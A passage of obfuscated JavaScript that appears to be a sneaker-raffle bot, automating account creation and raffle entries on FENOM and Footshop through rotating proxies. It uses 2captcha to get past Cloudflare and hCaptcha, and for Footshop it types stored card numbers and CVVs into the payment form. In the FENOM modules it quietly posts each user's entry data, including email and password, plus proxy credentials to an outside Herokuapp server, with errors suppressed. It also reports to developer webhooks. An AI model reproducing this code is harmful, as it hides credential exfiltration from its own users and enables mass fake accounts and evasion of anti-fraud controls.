                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x4bba5b[0x0] + ':' + _0x4bba5b[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x20c04f = await _0x284c7b['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x4bba5b[0x0] + ':' + _0x4bba5b[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x5a18f8 = await _0x20c04f['newPage']();
                                await _0x5a18f8['setViewport']({
                                    'width': 0x500 + _0x54670f(0x1, 0x32),
                                    'height': 0x2d9 + _0x54670f(0x1, 0x32)
                                });
                                const _0x52b06e = await _0x5a18f8['target']()['createCDPSession'](), { windowId: _0xc76f5f } = await _0x52b06e['send']('Browser.getWindowForTarget');
                                await _0x5a18f8['authenticate']({
                                    'username': '' + _0x4bba5b[0x2],
                                    'password': '' + _0x4bba5b[0x3]
                                }), console['log'](_0x303e65() + '\x20[' + _0x502aba['name'] + ']\x20Task\x20' + (_0x2dd89e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5a18f8['goto']('' + _0x700a9e, { 'waitUntil': 'networkidle2' }), console['log'](_0x303e65() + '\x20[' + _0x502aba['name'] + ']\x20Task\x20' + (_0x2dd89e + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4b01dc(0x1388);
                                var _0x374e53 = await _0x5a18f8['$']('.hcaptcha-box');
                                if (_0x374e53) {
                                    console['log'](_0x303e65() + '\x20[' + _0x502aba['name'] + ']\x20Task\x20' + (_0x2dd89e + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x4b01dc(0x2710);
                                    const _0xa7939 = await _0x5a18f8['$']('.hcaptcha-box');
                                    if (_0xa7939)
                                        try {
                                            await _0xa7939['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x5a18f8['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x3cfb03 = await _0x5a18f8['$']('.hcaptcha-box');
                                        if (_0x3cfb03)
                                            try {
                                                await _0x3cfb03['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x5a18f8['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x52b06e['send']('Browser.setWindowBounds', {
                                        'windowId': _0xc76f5f,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x4b01dc(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x303e65() + '\x20[' + _0x502aba['name'] + ']\x20Task\x20' + (_0x2dd89e + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x5a18f8['type']('input[name=\x22firstname\x22]', '' + _0x52e8f5[_0x2dd89e]['FirstName']), await _0x4b01dc(0x1f4), await _0x5a18f8['type']('input[name=\x22lastname\x22]', '' + _0x52e8f5[_0x2dd89e]['LastName']), await _0x4b01dc(0x1f4), await _0x5a18f8['type']('input[name=\x22email\x22]', '' + _0x52e8f5[_0x2dd89e]['Email']), await _0x4b01dc(0x1f4), await _0x5a18f8['type']('input[name=\x22password\x22]', '' + _0x52e8f5[_0x2dd89e]['Password']), await _0x4b01dc(0x258), await _0x5a18f8['$eval']('input[name=\x22psgdpr\x22]', _0x56b0a2 => _0x56b0a2['click']()), await _0x4b01dc(0x1f4), console['log'](_0x303e65() + '\x20[' + _0x502aba['name'] + ']\x20Task\x20' + (_0x2dd89e + 0x1) + '\x20:\x20Sending\x20Request'), await _0x5a18f8['$eval']('#customer-form', _0x2387e0 => _0x2387e0['submit']());
                                try {
                                    try {
                                        await _0x5a18f8['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x103a8e = 'no', console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x502aba['name'] + ']\x20Task\x20' + (_0x2dd89e + 0x1) + '\x20:\x20Account\x20' + _0x52e8f5[_0x2dd89e]['Email'] + '\x20Generated')), _0x3f6207['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x52e8f5[_0x2dd89e]['Email'] + ',' + _0x52e8f5[_0x2dd89e]['Password']);
                                    let _0x5e7e61 = _0x52e8f5[_0x2dd89e];
                                    try {
                                        prxdata = {
                                            'username': _0x4ebc10['replace']('#', ''),
                                            'module': _0x502aba['name'],
                                            'entrydata': JSON['stringify'](_0x5e7e61),
                                            'proxy': '' + _0x468177[_0x2dd89e]
                                        };
                                        var _0x111e80 = JSON['stringify'](prxdata);
                                        let _0x35e056 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0x111e80, _0x35e056);
                                    } catch (_0x5e6ec1) {
                                    }
                                    try {
                                        _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x24bed0['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x265172(_0x1fa40c, _0x24bed0['succesDEVMSG']);
                                } catch (_0x4c6abf) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x4e8f60) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x502aba['name'] + ']\x20Task\x20' + (_0x2dd89e + 0x1) + '\x20:\x20' + _0x4e8f60)), _0x350e9c = '' + _0x4e8f60;
                                var _0x1353ec = await _0x4a5b92(_0x52e8f5[_0x2dd89e], _0x502aba, 'acc', !![], _0x350e9c);
                                _0x24bed0['errorDEV'] = { 'embeds': [_0x1353ec] }, _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x24bed0['errorDEV']), await _0x265172(_0x3cc994, _0x24bed0['errorDEV']), _0x103a8e = 'yes';
                            } finally {
                                _0x20c04f && _0x20c04f['close']();
                                if (_0x103a8e == 'yes' && _0x31ae2d != 0x5)
                                    return console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x502aba['name'] + ']\x20Task\x20' + (_0x2dd89e + 0x1) + '\x20:\x20Retrying\x20(' + _0x31ae2d + '\x20/\x205)')), _0x31ae2d = _0x31ae2d + 0x1, _0x1057a6--, _0x274922(_0x502aba, _0x52e8f5, _0x468177, _0x2dd89e, _0x31ae2d);
                                _0x103a8e == 'yes' && _0x31ae2d >= 0x5 && _0x2b505c(_0x52e8f5[_0x2dd89e], _0x502aba), !_0x4e87fa && (console['log'](_0x303e65() + '\x20[' + _0x502aba['name'] + ']\x20Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay'])), _0x1057a6--;
                            }
                        }
                        _0x274922(_0x5bd067, _0x245733, _0xcd0d37, _0x351a51), !_0x4e87fa && await _0x4b01dc(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x504bf8(_0x252f79, _0x4acb1a, _0x256ebf) {
                    _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x33c579['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x480b66 = 0x0; _0x480b66 < _0x4acb1a['length']; _0x480b66++) {
                        if (_0x340f7c != 'yes')
                            var _0x340f7c = '', _0x2fe77a = 0x0;
                        var _0x3f6278;
                        try {
                            await _0x32ecbd(_0x4acb1a, _0x480b66);
                        } catch {
                            _0x340f7c = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x369d34(_0x252f79['name'] + '\x20Task\x20' + (_0x480b66 + 0x1) + '\x20/\x20' + _0x4acb1a['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                        const _0x44b639 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x3aaeae = Math['round'](Math['random']() * (_0x256ebf['length'] - 0x1)), _0xaf31f7 = _0x256ebf[_0x3aaeae]['split'](':'), _0xf5d016;
                        try {
                            _0xf5d016 = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xaf31f7[0x0] + ':' + _0xaf31f7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xf5d016 = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xaf31f7[0x0] + ':' + _0xaf31f7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3cbc5e = await _0xf5d016['newPage'](), _0xfb16cc = await _0x3cbc5e['target']()['createCDPSession'](), { windowId: _0x232d0a } = await _0xfb16cc['send']('Browser.getWindowForTarget');
                            await _0x3cbc5e['authenticate']({
                                'username': '' + _0xaf31f7[0x2],
                                'password': '' + _0xaf31f7[0x3]
                            }), console['log'](_0x303e65() + '\x20[' + _0x252f79['name'] + ']\x20Task\x20' + (_0x480b66 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3cbc5e['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x303e65() + '\x20[' + _0x252f79['name'] + ']\x20Task\x20' + (_0x480b66 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4b01dc(0x1388);
                            var _0x281962 = await _0x3cbc5e['$']('.hcaptcha-box');
                            if (_0x281962) {
                                console['log'](_0x303e65() + '\x20[' + _0x252f79['name'] + ']\x20Task\x20' + (_0x480b66 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x4b01dc(0x2710);
                                const _0x5c5657 = await _0x3cbc5e['$']('.hcaptcha-box');
                                if (_0x5c5657)
                                    try {
                                        await _0x5c5657['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x3cbc5e['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x508f70 = await _0x3cbc5e['$']('.hcaptcha-box');
                                    if (_0x508f70)
                                        try {
                                            await _0x508f70['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0xfb16cc['send']('Browser.setWindowBounds', {
                                'windowId': _0x232d0a,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x4b01dc(0x1f40);
                            try {
                                await _0x3cbc5e['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x4b01dc(0x1388), console['log'](_0x303e65() + '\x20[' + _0x252f79['name'] + ']\x20Task\x20' + (_0x480b66 + 0x1) + '\x20:\x20Logging\x20in'), await _0x3cbc5e['type']('input[name=\x22email\x22]', '' + _0x4acb1a[_0x480b66]['Email']), await _0x4b01dc(0x1f4), await _0x3cbc5e['type']('input[name=\x22password\x22]', '' + _0x4acb1a[_0x480b66]['Password']), await _0x4b01dc(0x258), await _0x3cbc5e['$eval']('#login-form', _0x5cbe85 => _0x5cbe85['submit']()), await _0x3cbc5e['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x4b01dc(0x1f4), await _0x3cbc5e['goto']('' + _0x4acb1a[_0x480b66]['Url']), await _0x3cbc5e['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x303e65() + '\x20[' + _0x252f79['name'] + ']\x20Task\x20' + (_0x480b66 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4acb1a[_0x480b66]['Size']);
                            if (_0x4acb1a[_0x480b66]['Size'] != 'RANDOM') {
                                var _0x161fca = '\x20' + _0x4acb1a[_0x480b66]['Size'] + '\x20';
                                const _0x35a3ce = await _0x3cbc5e['$x']('//span[contains(text(),\x20' + _0x161fca + ')]');
                                await _0x35a3ce[0x0]['click']();
                            } else {
                                const _0x1df921 = await _0x3cbc5e['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x1b2d26 = Math['round'](Math['random']() * (_0x1df921['length'] - 0x1));
                                await _0x1df921[_0x1b2d26]['click']();
                            }
                            await _0x4b01dc(0x258), await _0x3cbc5e['click']('#cookieChoiceDismiss'), await _0x4b01dc(0x3e8), await _0x3cbc5e['type']('#instagram-account', '' + _0x4acb1a[_0x480b66]['Follower']), await _0x4b01dc(0x28a), await _0x3cbc5e['click']('#book-btn'), await _0x4b01dc(0xbb8);
                            try {
                                await _0x3cbc5e['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x4b01dc(0x1f4), console['log'](_0x303e65() + '\x20[' + _0x252f79['name'] + ']\x20Task\x20' + (_0x480b66 + 0x1) + '\x20:\x20' + _0xd12810['cyan']('Solving\x20Captcha')), await _0x3cbc5e['solveRecaptchas'](), console['log'](_0x303e65() + '\x20[' + _0x252f79['name'] + ']\x20Task\x20' + (_0x480b66 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4b01dc(0x7d0), await _0x3cbc5e['$eval']('#book-btn-for-sure', _0xa88bc1 => _0xa88bc1['click']()), await _0x4b01dc(0x12c), await _0x3cbc5e['click']('#book-btn-for-sure'), await _0x4b01dc(0xdac);
                            const _0x3c456c = await _0x3cbc5e['$eval']('.reservation-popup\x20>\x20.title', _0x4a507d => {
                                return _0x4a507d['innerHTML'];
                            });
                            if (_0x3c456c) {
                                _0x340f7c = 'no', _0x41d22(_0x4acb1a[_0x480b66], _0x252f79), console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x252f79['name'] + ']\x20Task\x20' + (_0x480b66 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x419eab = await _0x4a5b92(_0x4acb1a[_0x480b66], _0x252f79, 'dev', ![]), _0x3c6d51 = await _0x4a5b92(_0x4acb1a[_0x480b66], _0x252f79, 'pub', ![]);
                                let _0xaa2439 = _0x4acb1a[_0x480b66];
                                try {
                                    prxdata = {
                                        'username': _0x4ebc10['replace']('#', ''),
                                        'module': _0x252f79['name'],
                                        'entrydata': JSON['stringify'](_0xaa2439),
                                        'proxy': '' + _0x256ebf[_0x480b66]
                                    };
                                    var _0x2f635a = JSON['stringify'](prxdata);
                                    let _0x2e5c6b = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0x2f635a, _0x2e5c6b);
                                } catch (_0xb78901) {
                                }
                                const _0x2cd65a = {
                                    'succesDEVMSG': { 'embeds': [_0x419eab] },
                                    'succesPUBMSG': { 'embeds': [_0x3c6d51] }
                                };
                                try {
                                    _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x2cd65a['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0x2cd65a['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x2c2f0f, _0x2cd65a['succesPUBMSG']);
                                } catch (_0x30ebed) {
                                    console['log'](_0xd12810['yellow'](_0x303e65() + '\x20[' + _0x252f79['name'] + ']\x20Task\x20' + (_0x480b66 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x30ebed));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0xcfc2c2) {
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x252f79['name'] + ']\x20Task\x20' + (_0x480b66 + 0x1) + '\x20:\x20' + _0xcfc2c2)), _0x3f6278 = '' + _0xcfc2c2;
                            var _0x6a5ff5 = await _0x4a5b92(_0x4acb1a[_0x480b66], _0x252f79, 'dev', !![], _0x3f6278), _0x419eab = await _0x4a5b92(_0x4acb1a[_0x480b66], _0x252f79, 'dev', ![]), _0x3c6d51 = await _0x4a5b92(_0x4acb1a[_0x480b66], _0x252f79, 'pub', ![]);
                            const _0x4cab5e = {
                                'succesDEVMSG': { 'embeds': [_0x419eab] },
                                'succesPUBMSG': { 'embeds': [_0x3c6d51] }
                            };
                            _0x4cab5e['errorDEV'] = { 'embeds': [_0x6a5ff5] }, _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x4cab5e['errorDEV']), await _0x265172(_0x3cc994, _0x4cab5e['errorDEV']), _0xcfc2c2 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x340f7c = 'yes');
                        } finally {
                            _0xf5d016['close']();
                            if (_0x340f7c == 'yes' && _0x2fe77a != 0x5 && _0x3f6278 != 'Size\x20Not\x20Found') {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x252f79['name'] + ']\x20Task\x20' + (_0x480b66 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2fe77a + '\x20/\x205)')), _0x480b66 = _0x480b66 - 0x1, _0x2fe77a = _0x2fe77a + 0x1;
                                continue;
                            }
                            _0x340f7c == 'yes' && _0x2fe77a >= 0x5 && (_0x2b505c(_0x4acb1a[_0x480b66], _0x252f79), _0x340f7c = 'no', _0x2fe77a = 0x0), console['log'](_0x303e65() + '\x20[' + _0x252f79['name'] + ']\x20Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x51ecc8, _0x44fffb, _0x2d3e31) {
                _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x33c579['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3cc99a = 0x0; _0x3cc99a < _0x44fffb['length']; _0x3cc99a++) {
                    var _0x28298b;
                    if (_0x4afb9a != 'yes')
                        var _0x4afb9a = '', _0x19a7e9 = 0x0;
                    var _0x15c64e = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x4ebc10
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x44fffb[_0x3cc99a]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x44fffb[_0x3cc99a]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x33c579['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5ddf1c
                            }
                        ]
                    }], _0x326480 = await _0x4a5b92(_0x44fffb[_0x3cc99a], _0x51ecc8, 'dev', ![]), _0x1008bd = await _0x4a5b92(_0x44fffb[_0x3cc99a], _0x51ecc8, 'pub', ![]);
                    const _0x4bf3b4 = {
                        'succesDEVMSG': { 'embeds': [_0x326480] },
                        'succesPUBMSG': { 'embeds': [_0x1008bd] }
                    }, _0x4d648b = { 'embeds': _0x15c64e };
                    try {
                        await _0x32ecbd(_0x44fffb, _0x3cc99a);
                    } catch {
                        _0x4afb9a = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x44fffb[_0x3cc99a]['Email'] == '' || _0x44fffb[_0x3cc99a]['FirstName'] == '' || _0x44fffb[_0x3cc99a]['LastName'] == '' || _0x44fffb[_0x3cc99a]['Country'] == '' || _0x44fffb[_0x3cc99a]['Size'] == '' || _0x44fffb[_0x3cc99a]['Address1'] == '' || _0x44fffb[_0x3cc99a]['Zip'] == '') {
                        console['log'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x44fffb[_0x3cc99a]['Email'] == '' || _0x44fffb[_0x3cc99a]['FirstName'] == '' || _0x44fffb[_0x3cc99a]['LastName'] == '' || _0x44fffb[_0x3cc99a]['Country'] == '' || _0x44fffb[_0x3cc99a]['Size'] == '' || _0x44fffb[_0x3cc99a]['Address1'] == '' || _0x44fffb[_0x3cc99a]['Zip'] == '' || _0x44fffb[_0x3cc99a]['Phone'] == '') {
                        console['log'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x360843 = '' + _0x44fffb[_0x3cc99a]['Url'];
                    if (_0x33c579['useRandomProxy'] = ![])
                        var _0x4390cd = _0x2d3e31[_0x3cc99a]['split'](':');
                    else
                        var _0x20192a = Math['round'](Math['random']() * (_0x2d3e31['length'] - 0x1)), _0x4390cd = _0x2d3e31[_0x20192a]['split'](':');
                    var _0x3364ed;
                    try {
                        _0x3364ed = await _0x284c7b['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4390cd[0x0] + ':' + _0x4390cd[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x3364ed = await _0x284c7b['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4390cd[0x0] + ':' + _0x4390cd[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x191404 = await _0x3364ed['newPage']();
                        await _0x191404['authenticate']({
                            'username': '' + _0x4390cd[0x2],
                            'password': '' + _0x4390cd[0x3]
                        }), console['log'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x191404['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x191404['setRequestInterception'](!![]), _0x191404['on']('request', _0x89bf69 => {
                            _0x89bf69['resourceType']() === 'image' || _0x89bf69['resourceType']() === 'font' || _0x89bf69['resourceType']() === 'media' ? _0x89bf69['abort']() : _0x89bf69['continue']();
                        });
                        try {
                            await _0x191404['goto'](_0x360843), await _0x4b01dc(0xbb8), await _0x191404['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x191404['click']('.control__JhutY'), await _0x4b01dc(0x1f4);
                        if (_0x44fffb[_0x3cc99a]['Size'] != 'RANDOM')
                            try {
                                const _0x2f7882 = await _0x191404['$x']('//div[contains(text(),\x20\x27' + _0x44fffb[_0x3cc99a]['Size'] + '\x27)]');
                                await _0x2f7882[0x0]['click']();
                            } catch {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x5e3df4 = await _0x191404['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x6763b8 = Math['round'](Math['random']() * (_0x5e3df4['length'] - 0x1));
                            await _0x5e3df4[_0x6763b8]['click']();
                        }
                        await _0x4b01dc(0x4b0);
                        const _0x288eb8 = await _0x191404['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x288eb8[0x0]['click'](), await _0x191404['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x191404['type']('input[name=\x22email\x22]', '' + _0x44fffb[_0x3cc99a]['Email']), await _0x4b01dc(0x640), await _0x191404['type']('input[name=\x22phone\x22]', '' + _0x44fffb[_0x3cc99a]['Phone']), await _0x4b01dc(0x4b0), await _0x191404['click']('button.btn.continue-button__1RtsS'), await _0x4b01dc(0x4b0);
                        try {
                            await _0x191404['type']('input[name=\x22firstName\x22]', '' + _0x44fffb[_0x3cc99a]['FirstName']), await _0x4b01dc(0x258);
                        } catch {
                            const _0x3f6bd8 = await _0x191404['$$eval']('.invalid-feedback\x20>\x20div', _0x30a929 => {
                                return _0x30a929['map'](_0x2137d7 => _0x2137d7['innerText']);
                            });
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x20' + _0x3f6bd8));
                            continue;
                        }
                        await _0x191404['type']('input[name=\x22lastName\x22]', '' + _0x44fffb[_0x3cc99a]['LastName']), await _0x4b01dc(0xc8), await _0x191404['type']('input[name=\x22instagramUsername\x22]', '' + _0x44fffb[_0x3cc99a]['Follower']), await _0x4b01dc(0x4b0), await _0x191404['click']('button.btn.continue-button__1RtsS'), await _0x4b01dc(0x3e8), console['log'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x191404['select']('select[name=\x22country\x22]', '' + _0x44fffb[_0x3cc99a]['Country']), await _0x4b01dc(0x2bc), await _0x191404['type']('input[name=\x22streetName\x22]', '' + _0x44fffb[_0x3cc99a]['Address1']), await _0x4b01dc(0x258), await _0x191404['type']('input[name=\x22houseNumber\x22]', _0x44fffb[_0x3cc99a]['HouseNumber'] + '\x20' + _0x44fffb[_0x3cc99a]['Address2']), await _0x4b01dc(0xc8), await _0x191404['type']('input[name=\x22postalCode\x22]', '' + _0x44fffb[_0x3cc99a]['Zip']), await _0x4b01dc(0x1f4), await _0x191404['type']('input[name=\x22city\x22]', '' + _0x44fffb[_0x3cc99a]['City']), await _0x4b01dc(0x4b0), await _0x191404['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x4b01dc(0x4b0), await _0x191404['click']('button.btn.continue-button__1RtsS'), await _0x4b01dc(0x4b0), console['log'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x191404['solveRecaptchas'](), console['log'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x4b01dc(0xbb8), await _0x191404['click']('button.btn.continue-button__1RtsS'), await _0x4b01dc(0x1388), console['log'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x191404['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x191404['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4b01dc(0x4b0), await _0x191404['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x44fffb[_0x3cc99a]['CardNumber']), await _0x4b01dc(0x320), await _0x191404['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x191404['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x44fffb[_0x3cc99a]['ExpiryDate']), await _0x4b01dc(0x4b0), await _0x191404['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x191404['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x44fffb[_0x3cc99a]['CVV']), await _0x4b01dc(0x226), await _0x191404['type']('input[name=\x22holderName\x22]', '' + _0x44fffb[_0x3cc99a]['NameOnCard']), await _0x4b01dc(0x226), await _0x191404['click']('button.adyen-checkout__button'), console['log'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x191404['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x4b01dc(0xbb8);
                        } catch (_0x52dd4a) {
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x51ecc8['name'] + ']\x20Task\x20' + (_0x3cc99a + 0x1) + '\x20:\x203DS\x20Failed')), _0x28298b = '3DS\x20Error\x20' + _0x52dd4a;
                            var _0x2f82ff = await _0x4a5b92(_0x44fffb[_0x3cc99a], _0x51ecc8, 'dev', !![], _0x28298b);
                            _0x4bf3b4['errorDEV'] = { 'embeds': [_0x2f82ff] };
                            _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x4bf3b4['errorDEV']);
                            await _0x265172(_0x3cc994, _0x4bf3b4['errorDEV']);
                            continue;
                        }
